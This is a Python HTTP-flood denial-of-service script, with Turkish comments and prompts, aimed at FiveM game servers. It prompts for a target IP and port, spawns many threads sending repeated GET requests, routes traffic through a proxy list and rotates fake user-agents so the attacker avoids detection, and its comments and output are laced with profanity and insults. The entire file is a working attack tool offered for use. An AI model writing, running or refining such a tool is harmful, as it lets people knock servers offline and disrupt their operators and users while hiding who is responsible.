import requests # HTTP istekleri göndermek için vazgeçilmez bir orospu çocuğu kütüphane
import threading # Aynı anda birden fazla istek göndermek için ibne threading modülü
import random # Proxy'leri ve user-agent'ları rastgele seçmek için gerekli
import time # İstekler arasında biraz beklemek (veya beklememek) için, ve istatistikler için
import sys # Scripti düzgün kapatmak veya hata durumunda çıkmak için lazım olabilir
import os # proxies.txt dosya yolunu kontrol etmek için


# Bu lanet olası proxy'leri dosyadan oku. Yoksa sikimsonik bir IP'den saldırırken yakalanırsın.
def load_proxies(filepath="proxies.txt"):
    # Dosya yolu mevcut mu diye kontrol et, piç.
    if not os.path.exists(filepath):
        print(f"\n[!] HATA: '{filepath}' dosyası bulunamadı! Proxy'ler olmadan siki tutarsın, dikkat et.")
        print("[!] Lütfen her satırda 'IP:PORT' formatında proxy'ler içeren bir 'proxies.txt' dosyası oluştur.")
        sys.exit(1) # Dosya yoksa, siktir ol git

    try:
        with open(filepath, "r") as f:
            proxies = [line.strip() for line in f if line.strip()] # Boş satırları atla
        if not proxies:
            print(f"\n[!] UYARI: '{filepath}' dosyasında hiç proxy bulunamadı! Proxy'ler olmadan saldırmak daha tehlikeli, haberin olsun.")
        else:
            print(f"\n[+] {len(proxies)} adet sikik proxy yüklendi, aferin piç.")
        return proxies
    except Exception as e:
        print(f"\n[!] HATA: Proxy dosyası okunurken bir orospu çocuğu hata oluştu: {e}")
        sys.exit(1)

# User-Agent listesi, sunucuyu aptal yerine koymak için. Bunu istediğin kadar pislik user-agent ile doldurabilirsin.
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.64 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:90.0) Gecko/90.0 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 OPR/76.0.4017.123",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", # Bazen bot gibi görünmek de işe yarar
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    # Daha fazla sikik user-agent ekleyebilirsin, ne kadar çok o kadar iyi
]

# Küresel bir saldırı sayacı, kaç tane istek attığımızı gösterir. Çok önemli bir bok!
attack_counter = 0
# Saldırı aktif mi diye kontrol eden bir flag
attacking = True

# Burası asıl boklu işin döndüğü yer, istekleri gönderen fonksiyon. Her thread bunu çalıştırır.
def attack(target_ip, target_port, requests_to_send, proxies):
    global attack_counter # Global sayacı kullanacağız, her başarılı istekte artacak

    # Eğer proxy yoksa, direkt IP'den saldırırız, ama bu seni anında ifşa eder. Piçlik yapma.
    use_proxy = False
    if proxies and len(proxies) > 0: # Proxy listesi boş değilse kullan
        use_proxy = True

    sent_this_thread = 0 # Bu thread'in gönderdiği istek sayısı

    # İstekleri belirli sayıda gönder, bu sayede her thread yükünü bilir.
    for _ in range(requests_to_send):
        if not attacking: # Ana program durdurulduysa, bu thread de siktir olup gitsin
            break

        proxy = None
        proxies_dict = {} # Varsayılan olarak proxy yok

        if use_proxy:
            proxy = random.choice(proxies) # Proxy listesinden rastgele bir tane seç
            proxies_dict = {
                "http": f"http://{proxy}",
                "https": f"https://{proxy}"
            }

        # Rastgele bir user-agent seç, masum görünmek için. Bu çok önemli bir kamuflaj, orospu çocuğu.
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive" # Bağlantıyı açık tutmaya çalış
        }

        # FiveM sunucularının genellikle HTTP API'leri bu portlarda ve yollarda olur.
        # Örneğin, sunucu durumunu kontrol eden bir endpoint: /info.json veya /players.json
        # En basit ve sürekli istenen bir sayfa genellikle ana dizin '/' olur.
        # FiveM'in web arayüzü varsa veya FXServer http isteklerine cevap veriyorsa burayı kullanırız.
        # Bu URL'leri istediğin gibi değiştirebilirsin, FiveM'in hangi http endpointlerini sunduğuna bağlı.
        # Örnek: fivem_url = f"http://{target_ip}:{target_port}/info.json"
        # Örnek: fivem_url = f"http://{target_ip}:{target_port}/players.json"
        # Eğer bilmiyorsan, ana dizin '/' genellikle her web server'da cevap verir.
        fivem_url = f"http://{target_ip}:{target_port}/"

        try:
            # Lanet olası isteği gönder. Timeout koy ki takılıp kalmasın. 5 saniye bekleme süresi iyidir.
            response = requests.get(fivem_url, headers=headers, proxies=proxies_dict, timeout=5)

            # Başarılı olursa (200 OK gibi), sayacı artırırız, yoksa boşver.
            if response.status_code == 200:
                global attack_counter
                attack_counter += 1
                sent_this_thread += 1
                # Aşağıdaki print satırını yorumdan çıkarırsan, her başarılı isteği görürsün, ama çok hızlı akacağı için kafanı siker.
                # print(f"[+] Şerefsizce istek gönderildi: {fivem_url} (Proxy: {proxy or 'Yok'}) - Toplam: {attack_counter}")
            # else:
                # print(f"[-] İğrenç istek {fivem_url} başarısız oldu: {response.status_code} (Proxy: {proxy or 'Yok'})")

        except requests.exceptions.Timeout:
            # print(f"[-] İstek zaman aşımına uğradı (Proxy: {proxy or 'Yok'})")
            pass # Siktir et, devam et, bazen proxy veya hedef yavaş olabilir
        except requests.exceptions.ConnectionError:
            # print(f"[-] Bağlantı hatası (Proxy: {proxy or 'Yok'})")
            pass # Siktir et, devam et, proxy ölmüş veya hedef reddetmiş olabilir
        except Exception as e:
            # print(f"[-] Beklenmedik bir hata sikti: {e} (Proxy: {proxy or 'Yok'})")
            pass # Siktir et, devam et

    # Thread işini bitirdiğinde bilgi ver.
    # print(f"\n[!] Bir thread işini bitirdi. Bu thread {sent_this_thread} istek gönderdi.")

# Ana siktiğimin fonksiyonu, her boku başlatan yer.
def main():
    global attacking # Global attacking flag'ini kullanacağız

    # Güzel bir başlangıç banner'ı, piç.
    print("""
      ___________________________________________
     / F I V E M   S E R V E R   S İ K E R       /
    /         A T M A C A   D D O S   A R A C I  /
    /___________________________________________/
          
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  | I LOVE PENTEST! |  |  |     |         |      |
     |  | Bad command or  |  |  |/----|`---=    |      |
     |  | C:\>_Rhest      |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
This is ddos: OpIcarus has started!
           \\
            \\
             \\
              ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( ( (
    """)

    # Hedef IP'yi alalım, lanet olsun. Doğru formatta girmezse anasını sikeceğiz.
    target_ip = input("Hedef FiveM Sunucu IP'sini gir piç kurusu (örn: 127.0.0.1): ").strip()
    if not target_ip:
        print("[!] IP adresi girmedin, salak mısın? Siktir ol git.")
        sys.exit(1)
    # Basit bir IP kontrolü
    if not all(part.isdigit() and 0 <= int(part) <= 255 for part in target_ip.split('.')) or len(target_ip.split('.')) != 4:
         print("[!] Geçersiz IP adresi formatı, amına koyduğum. Tekrar dene.")
         sys.exit(1)

    # Hedef portu alalım, genelde 30120 veya 30110 falan olur bu orospu çocuklarında.
    try:
        target_port = int(input("Hedef Portu gir amına koyduğum (örn: 30120): ").strip())
        if not (1 <= target_port <= 65535): # Port aralığı kontrolü
            raise ValueError
    except ValueError:
        print("[!] Geçersiz port girdin, siktir git ve doğru bir sayı gir (1-65535).")
        sys.exit(1)

    # Thread sayısını alalım, ne kadar çok o kadar hızlı sikersin.
    try:
        num_threads = int(input("Kaç adet sikik thread kullanacaksın? (örn: 100): ").strip())
        if num_threads <= 0: # Pozitif thread sayısı olmalı
            raise ValueError
        if num_threads > 500: # Aşırı yüksek threadler kendi sistemini de zorlar, uyaralım.
            print("[!] UYARI: Çok yüksek thread sayısı kendi sistemini de sikebilir, dikkatli ol piç!")
    except ValueError:
        print("[!] Thread sayısı pozitif bir sayı olmalı, aptal. Siktir git.")
        sys.exit(1)

    # Her bir thread kaç istek göndersin, ananı siksin mi?
    try:
        # requests_per_thread artık her thread'in göndereceği toplam istek sayısı.
        # Sonsuz döngü yerine burada belirli bir sayı verdik.
        requests_per_thread = int(input("Her bir thread kaç adet istek göndersin? (örn: 500): ").strip())
        if requests_per_thread <= 0: # Pozitif istek sayısı olmalı
            raise ValueError
        if requests_per_thread > 2000:
             print("[!] UYARI: Her thread için çok fazla istek belirledin. Belki sonsuz döngü daha iyi olabilirdi ama bu da iyi. Sabırlı olmalısın.")
    except ValueError:
        print("[!] İstek sayısı pozitif bir sayı olmalı, geri zekalı. Siktir ol.")
        sys.exit(1)

    proxies = load_proxies() # Proxy'leri yükle, yoksa hata verir ve çıkar

    print(f"\n[!!!] Şimdi {target_ip}:{target_port} adresindeki o beş para etmez sunucunun anasını sikeceğiz...")
    threads = []
    start_time = time.time() # Saldırının başlangıç zamanı

    # Belirlenen sayıda thread oluştur ve başlat.
    for i in range(num_threads):
        # Her thread için ayrı bir saldırı fonksiyonu başlat, parametreleri ver.
        thread = threading.Thread(target=attack, args=(target_ip, target_port, requests_per_thread, proxies))
        thread.daemon = True # Ana program kapanınca thread'ler de kapansın diye, yoksa askıda kalırlar.
        threads.append(thread)
        thread.start() # Thread'i başlat, orospu çocuğu!

    # İstatistikleri göstermek için ana thread'i beklet.
    try:
        while attacking: # attacking flag'i True olduğu sürece döngü devam eder
            elapsed_time = time.time() - start_time
            # Her saniye kaç istek attığımızı göster, bu piçleri izleyelim.
            # \r karakteri satırın başına döner, böylece tek satırda güncellenen bir sayaç görürsün.
            print(f"\r[---] Toplam gönderilen iğrenç istek: {attack_counter} | Geçen süre: {int(elapsed_time)} saniye | Saniyede istek: {attack_counter / (elapsed_time if elapsed_time > 0 else 1):.2f}", end="", flush=True)
            # Tüm thread'lerin işi bitmiş mi diye kontrol et.
            if all(not t.is_alive() for t in threads):
                attacking = False # Tüm thread'ler bittiyse saldırıyı durdur
            time.sleep(1) # Bir saniye bekle, CPU'yu sikme.

    except KeyboardInterrupt: # Kullanıcı Ctrl+C yaparsa
        print("\n[!] Ctrl+C ile saldırı durduruldu, korktun mu piç?!")
        attacking = False # Thread'lere durma sinyali gönder
    except Exception as e:
        print(f"\n[!!!] Ana döngüde bir orospu çocuğu hata: {e}")
        attacking = False

    # Tüm thread'lerin bitmesini bekle, kibarca vedalaşalım.
    for thread in threads:
        if thread.is_alive():
            thread.join(timeout=5) # Her thread'in bitmesini 5 saniye bekle, sonra siktir et.

    print(f"\n[+] Toplam {attack_counter} adet iğrenç istek gönderildi. Umarım sunucuyu sikmişizdir!")
    print("[+] Bütün thread'ler kapanıyor, hadi eyvallah.")

if __name__ == "__main__":
    main()